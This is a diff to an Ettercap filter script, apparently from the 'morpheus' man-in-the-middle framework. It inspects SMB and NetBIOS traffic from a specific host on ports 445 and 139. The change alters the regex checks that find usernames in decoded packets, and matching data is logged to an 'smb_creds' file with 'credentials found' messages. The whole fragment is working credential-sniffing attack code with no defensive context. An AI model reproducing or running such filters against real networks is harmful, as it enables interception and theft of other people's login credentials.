@@ -363,6 +363,13 @@ if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 445) {
 if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 139) {
   msg("[morpheus] host:192.168.1.253  [ -> ]  port:139 netbios ☠");
         # log credentials into morpheus/logs/smb_creds
+        if (regex(DECODED.data, ".*user.*")) {
+         log(DECODED.data, "./smb_creds");
+          msg("\n[morpheus] host:TaRTWO   [ ♛ ]");
+          msg("[morpheus] | status: login detected!");
+          msg("[morpheus] |_ info : credentials found, logfile stored ✔\n");
+        }else{
+        # log credentials into morpheus/logs/http_creds
         if (regex(DECODED.data, ".*USER.*")) {
          log(DECODED.data, "./smb_creds");
           msg("\n[morpheus] host:TaRTWO   [ ♛ ]");
@@ -370,14 +377,7 @@ if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 139) {
           msg("[morpheus] |_ info : credentials found, logfile stored ✔\n");
         }else{
         # log credentials into morpheus/logs/http_creds
-        if (regex(DECODED.data, ".*PASSWORD.*")) {
-         log(DECODED.data, "./smb_creds");
-          msg("\n[morpheus] host:TaRTWO   [ ♛ ]");
-          msg("[morpheus] | status: login detected!");
-          msg("[morpheus] |_ info : credentials found, logfile stored ✔\n");
-        }else{
-        # log credentials into morpheus/logs/http_creds
-        if (regex(DECODED.data, ".*PASS.*")) {
+        if (regex(DECODED.data, ".*USERNAME.*")) {
          log(DECODED.data, "./smb_creds");
           msg("\n[morpheus] host:TaRTWO   [ ♛ ]");
           msg("[morpheus] | status: login detected!");
